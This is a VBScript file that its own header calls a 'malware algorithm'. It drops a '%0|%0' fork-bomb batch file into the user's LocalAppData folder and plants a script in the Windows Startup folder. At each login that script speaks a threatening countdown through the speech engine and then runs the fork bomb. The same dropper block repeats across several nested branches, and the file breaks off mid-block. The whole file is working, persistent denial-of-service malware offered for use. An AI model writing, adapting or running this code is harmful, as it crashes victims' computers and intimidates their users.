' Malware algorithm designed by- SAM

dim x, y, z, p, a, n, o, b, c, d, e, f, h, j, q, r, b1,b2, b3, b4, b5, b6, objWMIService, strComputer, strNewName, curDir, startupFolder, errResult, FileList


Set objShell = CreateObject("WScript.Shell")
startupFolder = objShell.SpecialFolders("Startup")

Set objFSO = CreateObject("Scripting.FileSystemObject")
curDir=CreateObject("WScript.Shell").ExpandEnvironmentStrings("%LocalAppData%")

set objFSO = nothing
set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(startupFolder & "\t1e9m9p6s3a0m8.vbs") Then
fso.DeleteFile(startupFolder & "\t1e9m9p6s3a0m8.vbs")
If fso.FileExists(curDir & "\h2a3C39k124.bat") Then
fso.DeleteFile(curDir & "\h2a3C39k124.bat")

Const ForAppending = 8

a = "%0|%0"
x = "Dim shell"
b1 = "p = " & chr(34) & "60000" & chr(34) & " + u"
b2 = "u = z*60"
b3 = "z = r & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34)
b4 = "r = int(rnd*5) + 1"
b5 = "randomize"
b6 = "dim r, z, u, p"
y = "wscript.sleep p"
z = "Set shell = CreateObject("
n = "WScript.Shell"
o = ")"
u = z & chr(34) & n & chr(34) & o
b = "Set objFSO = CreateObject("
c = "Scripting.FileSystemObject"
d = b & chr(34) & c & chr(34) & o
e = "curDir=CreateObject("
f = ").ExpandEnvironmentStrings("
h = "%LocalAppData%"
j = e & chr(34) & n & chr(34) & f & chr(34) & h & chr(34) & o
p = "shell.Run curDir & "
q = "\h2a3C39k124.bat"
r = p & chr(34) & q & chr(34)
v = "Set sapi = CreateObject("
vv = "sapi.spvoice"
vvv = v & chr(34) & vv & chr(34) & o
xxx = "wscript.sleep 60000"
yyy = "msg = " & chr(34) & "Poor Windows User. Leave the control of this computer, or the OS will be useless in less than five minutes" & chr(34)
zzz = "sapi.Speak msg"
yyyy = "msg2 = " & chr(34) & "five, four, three, two, one. Enjoy!" & chr(34)
zzzz = "sapi.Speak msg2"

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (curDir & "\h2a3C39k124.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(a)

objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & curDir & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "h2a3C39k124" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "bat"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next

wscript.sleep 50
set objFSO = nothing


Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (startupFolder & "\t1e9m9p6s3a0m8.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(vvv)
objTextFile.WriteLine(xxx)
objTextFile.WriteLine(yyy)
objTextFile.WriteLine(zzz)
objTextFile.WriteLine(b6)
objTextFile.WriteLine(b5)
objTextFile.WriteLine(b4)
objTextFile.WriteLine(b3)
objTextFile.WriteLine(b2)
objTextFile.WriteLine(b1)
objTextFile.WriteLine(y)
objTextFile.WriteLine(d)
objTextFile.WriteLine(j)
objTextFile.WriteLine(x)
objTextFile.WriteLine(u)
objTextFile.WriteLine(yyyy)
objTextFile.WriteLine(zzzz)
objTextFile.WriteLine(r)
objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & startupFolder & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "t1e9m9p6s3a0m8" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "vbs"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next
wscript.quit
elseIf fso.FileExists(curDir & "\h2a3C39k124.txt") Then
fso.DeleteFile(curDir & "\h2a3C39k124.txt")

a = "%0|%0"
x = "Dim shell"
b1 = "p = " & chr(34) & "60000" & chr(34) & " + u"
b2 = "u = z*60"
b3 = "z = r & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34)
b4 = "r = int(rnd*5) + 1"
b5 = "randomize"
b6 = "dim r, z, u, p"
y = "wscript.sleep p"
z = "Set shell = CreateObject("
n = "WScript.Shell"
o = ")"
u = z & chr(34) & n & chr(34) & o
b = "Set objFSO = CreateObject("
c = "Scripting.FileSystemObject"
d = b & chr(34) & c & chr(34) & o
e = "curDir=CreateObject("
f = ").ExpandEnvironmentStrings("
h = "%LocalAppData%"
j = e & chr(34) & n & chr(34) & f & chr(34) & h & chr(34) & o
p = "shell.Run curDir & "
q = "\h2a3C39k124.bat"
r = p & chr(34) & q & chr(34)
v = "Set sapi = CreateObject("
vv = "sapi.spvoice"
vvv = v & chr(34) & vv & chr(34) & o
xxx = "wscript.sleep 60000"
yyy = "msg = " & chr(34) & "Poor Windows User. Leave the control of this computer, or the OS will be useless in less than five minutes" & chr(34)
zzz = "sapi.Speak msg"
yyyy = "msg2 = " & chr(34) & "five, four, three, two, one. Enjoy!" & chr(34)
zzzz = "sapi.Speak msg2"

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (curDir & "\h2a3C39k124.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(a)

objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & curDir & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "h2a3C39k124" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "bat"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next

wscript.sleep 50
set objFSO = nothing


Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (startupFolder & "\t1e9m9p6s3a0m8.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(vvv)
objTextFile.WriteLine(xxx)
objTextFile.WriteLine(yyy)
objTextFile.WriteLine(zzz)
objTextFile.WriteLine(b6)
objTextFile.WriteLine(b5)
objTextFile.WriteLine(b4)
objTextFile.WriteLine(b3)
objTextFile.WriteLine(b2)
objTextFile.WriteLine(b1)
objTextFile.WriteLine(y)
objTextFile.WriteLine(d)
objTextFile.WriteLine(j)
objTextFile.WriteLine(x)
objTextFile.WriteLine(u)
objTextFile.WriteLine(yyyy)
objTextFile.WriteLine(zzzz)
objTextFile.WriteLine(r)
objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & startupFolder & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "t1e9m9p6s3a0m8" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "vbs"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next
wscript.quit

Else

a = "%0|%0"
x = "Dim shell"
b1 = "p = " & chr(34) & "60000" & chr(34) & " + u"
b2 = "u = z*60"
b3 = "z = r & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34)
b4 = "r = int(rnd*5) + 1"
b5 = "randomize"
b6 = "dim r, z, u, p"
y = "wscript.sleep p"
z = "Set shell = CreateObject("
n = "WScript.Shell"
o = ")"
u = z & chr(34) & n & chr(34) & o
b = "Set objFSO = CreateObject("
c = "Scripting.FileSystemObject"
d = b & chr(34) & c & chr(34) & o
e = "curDir=CreateObject("
f = ").ExpandEnvironmentStrings("
h = "%LocalAppData%"
j = e & chr(34) & n & chr(34) & f & chr(34) & h & chr(34) & o
p = "shell.Run curDir & "
q = "\h2a3C39k124.bat"
r = p & chr(34) & q & chr(34)
v = "Set sapi = CreateObject("
vv = "sapi.spvoice"
vvv = v & chr(34) & vv & chr(34) & o
xxx = "wscript.sleep 60000"
yyy = "msg = " & chr(34) & "Poor Windows User. Leave the control of this computer, or the OS will be useless in less than five minutes" & chr(34)
zzz = "sapi.Speak msg"
yyyy = "msg2 = " & chr(34) & "five, four, three, two, one. Enjoy!" & chr(34)
zzzz = "sapi.Speak msg2"

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (curDir & "\h2a3C39k124.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(a)

objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & curDir & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "h2a3C39k124" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "bat"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next

wscript.sleep 50
set objFSO = nothing


Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (startupFolder & "\t1e9m9p6s3a0m8.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(vvv)
objTextFile.WriteLine(xxx)
objTextFile.WriteLine(yyy)
objTextFile.WriteLine(zzz)
objTextFile.WriteLine(b6)
objTextFile.WriteLine(b5)
objTextFile.WriteLine(b4)
objTextFile.WriteLine(b3)
objTextFile.WriteLine(b2)
objTextFile.WriteLine(b1)
objTextFile.WriteLine(y)
objTextFile.WriteLine(d)
objTextFile.WriteLine(j)
objTextFile.WriteLine(x)
objTextFile.WriteLine(u)
objTextFile.WriteLine(yyyy)
objTextFile.WriteLine(zzzz)
objTextFile.WriteLine(r)
objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & startupFolder & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "t1e9m9p6s3a0m8" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "vbs"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next
wscript.quit
End If



ElseIf fso.FileExists(startupFolder & "\t1e9m9p6s3a0m8.txt") Then
fso.DeleteFile(startupFolder & "\t1e9m9p6s3a0m8.txt")
If fso.FileExists(curDir & "\h2a3C39k124.bat") Then
fso.DeleteFile(curDir & "\h2a3C39k124.bat")

a = "%0|%0"
x = "Dim shell"
b1 = "p = " & chr(34) & "60000" & chr(34) & " + u"
b2 = "u = z*60"
b3 = "z = r & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34)
b4 = "r = int(rnd*5) + 1"
b5 = "randomize"
b6 = "dim r, z, u, p"
y = "wscript.sleep p"
z = "Set shell = CreateObject("
n = "WScript.Shell"
o = ")"
u = z & chr(34) & n & chr(34) & o
b = "Set objFSO = CreateObject("
c = "Scripting.FileSystemObject"
d = b & chr(34) & c & chr(34) & o
e = "curDir=CreateObject("
f = ").ExpandEnvironmentStrings("
h = "%LocalAppData%"
j = e & chr(34) & n & chr(34) & f & chr(34) & h & chr(34) & o
p = "shell.Run curDir & "
q = "\h2a3C39k124.bat"
r = p & chr(34) & q & chr(34)
v = "Set sapi = CreateObject("
vv = "sapi.spvoice"
vvv = v & chr(34) & vv & chr(34) & o
xxx = "wscript.sleep 60000"
yyy = "msg = " & chr(34) & "Poor Windows User. Leave the control of this computer, or the OS will be useless in less than five minutes" & chr(34)
zzz = "sapi.Speak msg"
yyyy = "msg2 = " & chr(34) & "five, four, three, two, one. Enjoy!" & chr(34)
zzzz = "sapi.Speak msg2"

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (curDir & "\h2a3C39k124.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(a)

objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & curDir & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "h2a3C39k124" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "bat"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next

wscript.sleep 50
set objFSO = nothing


Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (startupFolder & "\t1e9m9p6s3a0m8.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(vvv)
objTextFile.WriteLine(xxx)
objTextFile.WriteLine(yyy)
objTextFile.WriteLine(zzz)
objTextFile.WriteLine(b6)
objTextFile.WriteLine(b5)
objTextFile.WriteLine(b4)
objTextFile.WriteLine(b3)
objTextFile.WriteLine(b2)
objTextFile.WriteLine(b1)
objTextFile.WriteLine(y)
objTextFile.WriteLine(d)
objTextFile.WriteLine(j)
objTextFile.WriteLine(x)
objTextFile.WriteLine(u)
objTextFile.WriteLine(yyyy)
objTextFile.WriteLine(zzzz)
objTextFile.WriteLine(r)
objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & startupFolder & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "t1e9m9p6s3a0m8" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "vbs"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next
wscript.quit
elseIf fso.FileExists(curDir & "\h2a3C39k124.txt") Then
fso.DeleteFile(curDir & "\h2a3C39k124.txt")

a = "%0|%0"
x = "Dim shell"
b1 = "p = " & chr(34) & "60000" & chr(34) & " + u"
b2 = "u = z*60"
b3 = "z = r & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34)
b4 = "r = int(rnd*5) + 1"
b5 = "randomize"
b6 = "dim r, z, u, p"
y = "wscript.sleep p"
z = "Set shell = CreateObject("
n = "WScript.Shell"
o = ")"
u = z & chr(34) & n & chr(34) & o
b = "Set objFSO = CreateObject("
c = "Scripting.FileSystemObject"
d = b & chr(34) & c & chr(34) & o
e = "curDir=CreateObject("
f = ").ExpandEnvironmentStrings("
h = "%LocalAppData%"
j = e & chr(34) & n & chr(34) & f & chr(34) & h & chr(34) & o
p = "shell.Run curDir & "
q = "\h2a3C39k124.bat"
r = p & chr(34) & q & chr(34)
v = "Set sapi = CreateObject("
vv = "sapi.spvoice"
vvv = v & chr(34) & vv & chr(34) & o
xxx = "wscript.sleep 60000"
yyy = "msg = " & chr(34) & "Poor Windows User. Leave the control of this computer, or the OS will be useless in less than five minutes" & chr(34)
zzz = "sapi.Speak msg"
yyyy = "msg2 = " & chr(34) & "five, four, three, two, one. Enjoy!" & chr(34)
zzzz = "sapi.Speak msg2"

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (curDir & "\h2a3C39k124.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(a)

objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & curDir & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "h2a3C39k124" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "bat"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next

wscript.sleep 50
set objFSO = nothing


Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (startupFolder & "\t1e9m9p6s3a0m8.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(vvv)
objTextFile.WriteLine(xxx)
objTextFile.WriteLine(yyy)
objTextFile.WriteLine(zzz)
objTextFile.WriteLine(b6)
objTextFile.WriteLine(b5)
objTextFile.WriteLine(b4)
objTextFile.WriteLine(b3)
objTextFile.WriteLine(b2)
objTextFile.WriteLine(b1)
objTextFile.WriteLine(y)
objTextFile.WriteLine(d)
objTextFile.WriteLine(j)
objTextFile.WriteLine(x)
objTextFile.WriteLine(u)
objTextFile.WriteLine(yyyy)
objTextFile.WriteLine(zzzz)
objTextFile.WriteLine(r)
objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & startupFolder & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "t1e9m9p6s3a0m8" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "vbs"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next
wscript.quit

Else

a = "%0|%0"
x = "Dim shell"
b1 = "p = " & chr(34) & "60000" & chr(34) & " + u"
b2 = "u = z*60"
b3 = "z = r & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34)
b4 = "r = int(rnd*5) + 1"
b5 = "randomize"
b6 = "dim r, z, u, p"
y = "wscript.sleep p"
z = "Set shell = CreateObject("
n = "WScript.Shell"
o = ")"
u = z & chr(34) & n & chr(34) & o
b = "Set objFSO = CreateObject("
c = "Scripting.FileSystemObject"
d = b & chr(34) & c & chr(34) & o
e = "curDir=CreateObject("
f = ").ExpandEnvironmentStrings("
h = "%LocalAppData%"
j = e & chr(34) & n & chr(34) & f & chr(34) & h & chr(34) & o
p = "shell.Run curDir & "
q = "\h2a3C39k124.bat"
r = p & chr(34) & q & chr(34)
v = "Set sapi = CreateObject("
vv = "sapi.spvoice"
vvv = v & chr(34) & vv & chr(34) & o
xxx = "wscript.sleep 60000"
yyy = "msg = " & chr(34) & "Poor Windows User. Leave the control of this computer, or the OS will be useless in less than five minutes" & chr(34)
zzz = "sapi.Speak msg"
yyyy = "msg2 = " & chr(34) & "five, four, three, two, one. Enjoy!" & chr(34)
zzzz = "sapi.Speak msg2"

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (curDir & "\h2a3C39k124.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(a)

objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & curDir & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "h2a3C39k124" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "bat"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next

wscript.sleep 50
set objFSO = nothing


Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (startupFolder & "\t1e9m9p6s3a0m8.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(vvv)
objTextFile.WriteLine(xxx)
objTextFile.WriteLine(yyy)
objTextFile.WriteLine(zzz)
objTextFile.WriteLine(b6)
objTextFile.WriteLine(b5)
objTextFile.WriteLine(b4)
objTextFile.WriteLine(b3)
objTextFile.WriteLine(b2)
objTextFile.WriteLine(b1)
objTextFile.WriteLine(y)
objTextFile.WriteLine(d)
objTextFile.WriteLine(j)
objTextFile.WriteLine(x)
objTextFile.WriteLine(u)
objTextFile.WriteLine(yyyy)
objTextFile.WriteLine(zzzz)
objTextFile.WriteLine(r)
objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & startupFolder & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "t1e9m9p6s3a0m8" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "vbs"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next
wscript.quit
End If





else
If fso.FileExists(curDir & "\h2a3C39k124.bat") Then
fso.DeleteFile(curDir & "\h2a3C39k124.bat")


a = "%0|%0"
x = "Dim shell"
b1 = "p = " & chr(34) & "60000" & chr(34) & " + u"
b2 = "u = z*60"
b3 = "z = r & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34)
b4 = "r = int(rnd*5) + 1"
b5 = "randomize"
b6 = "dim r, z, u, p"
y = "wscript.sleep p"
z = "Set shell = CreateObject("
n = "WScript.Shell"
o = ")"
u = z & chr(34) & n & chr(34) & o
b = "Set objFSO = CreateObject("
c = "Scripting.FileSystemObject"
d = b & chr(34) & c & chr(34) & o
e = "curDir=CreateObject("
f = ").ExpandEnvironmentStrings("
h = "%LocalAppData%"
j = e & chr(34) & n & chr(34) & f & chr(34) & h & chr(34) & o
p = "shell.Run curDir & "
q = "\h2a3C39k124.bat"
r = p & chr(34) & q & chr(34)
v = "Set sapi = CreateObject("
vv = "sapi.spvoice"
vvv = v & chr(34) & vv & chr(34) & o
xxx = "wscript.sleep 60000"
yyy = "msg = " & chr(34) & "Poor Windows User. Leave the control of this computer, or the OS will be useless in less than five minutes" & chr(34)
zzz = "sapi.Speak msg"
yyyy = "msg2 = " & chr(34) & "five, four, three, two, one. Enjoy!" & chr(34)
zzzz = "sapi.Speak msg2"

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (curDir & "\h2a3C39k124.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(a)

objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & curDir & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "h2a3C39k124" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "bat"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next

wscript.sleep 50
set objFSO = nothing


Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (startupFolder & "\t1e9m9p6s3a0m8.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(vvv)
objTextFile.WriteLine(xxx)
objTextFile.WriteLine(yyy)
objTextFile.WriteLine(zzz)
objTextFile.WriteLine(b6)
objTextFile.WriteLine(b5)
objTextFile.WriteLine(b4)
objTextFile.WriteLine(b3)
objTextFile.WriteLine(b2)
objTextFile.WriteLine(b1)
objTextFile.WriteLine(y)
objTextFile.WriteLine(d)
objTextFile.WriteLine(j)
objTextFile.WriteLine(x)
objTextFile.WriteLine(u)
objTextFile.WriteLine(yyyy)
objTextFile.WriteLine(zzzz)
objTextFile.WriteLine(r)
objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & startupFolder & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "t1e9m9p6s3a0m8" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "vbs"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next
wscript.quit
ElseIf fso.FileExists(curDir & "\h2a3C39k124.txt") Then
fso.DeleteFile(curDir & "\h2a3C39k124.txt")

a = "%0|%0"
x = "Dim shell"
b1 = "p = " & chr(34) & "60000" & chr(34) & " + u"
b2 = "u = z*60"
b3 = "z = r & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34)
b4 = "r = int(rnd*5) + 1"
b5 = "randomize"
b6 = "dim r, z, u, p"
y = "wscript.sleep p"
z = "Set shell = CreateObject("
n = "WScript.Shell"
o = ")"
u = z & chr(34) & n & chr(34) & o
b = "Set objFSO = CreateObject("
c = "Scripting.FileSystemObject"
d = b & chr(34) & c & chr(34) & o
e = "curDir=CreateObject("
f = ").ExpandEnvironmentStrings("
h = "%LocalAppData%"
j = e & chr(34) & n & chr(34) & f & chr(34) & h & chr(34) & o
p = "shell.Run curDir & "
q = "\h2a3C39k124.bat"
r = p & chr(34) & q & chr(34)
v = "Set sapi = CreateObject("
vv = "sapi.spvoice"
vvv = v & chr(34) & vv & chr(34) & o
xxx = "wscript.sleep 60000"
yyy = "msg = " & chr(34) & "Poor Windows User. Leave the control of this computer, or the OS will be useless in less than five minutes" & chr(34)
zzz = "sapi.Speak msg"
yyyy = "msg2 = " & chr(34) & "five, four, three, two, one. Enjoy!" & chr(34)
zzzz = "sapi.Speak msg2"

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (curDir & "\h2a3C39k124.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(a)

objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & curDir & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "h2a3C39k124" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "bat"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next

wscript.sleep 50
set objFSO = nothing


Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (startupFolder & "\t1e9m9p6s3a0m8.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(vvv)
objTextFile.WriteLine(xxx)
objTextFile.WriteLine(yyy)
objTextFile.WriteLine(zzz)
objTextFile.WriteLine(b6)
objTextFile.WriteLine(b5)
objTextFile.WriteLine(b4)
objTextFile.WriteLine(b3)
objTextFile.WriteLine(b2)
objTextFile.WriteLine(b1)
objTextFile.WriteLine(y)
objTextFile.WriteLine(d)
objTextFile.WriteLine(j)
objTextFile.WriteLine(x)
objTextFile.WriteLine(u)
objTextFile.WriteLine(yyyy)
objTextFile.WriteLine(zzzz)
objTextFile.WriteLine(r)
objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & startupFolder & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "t1e9m9p6s3a0m8" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "vbs"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next
wscript.quit
Else

a = "%0|%0"
x = "Dim shell"
b1 = "p = " & chr(34) & "60000" & chr(34) & " + u"
b2 = "u = z*60"
b3 = "z = r & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34) & " & " & chr(34) & "0" & chr(34)
b4 = "r = int(rnd*5) + 1"
b5 = "randomize"
b6 = "dim r, z, u, p"
y = "wscript.sleep p"
z = "Set shell = CreateObject("
n = "WScript.Shell"
o = ")"
u = z & chr(34) & n & chr(34) & o
b = "Set objFSO = CreateObject("
c = "Scripting.FileSystemObject"
d = b & chr(34) & c & chr(34) & o
e = "curDir=CreateObject("
f = ").ExpandEnvironmentStrings("
h = "%LocalAppData%"
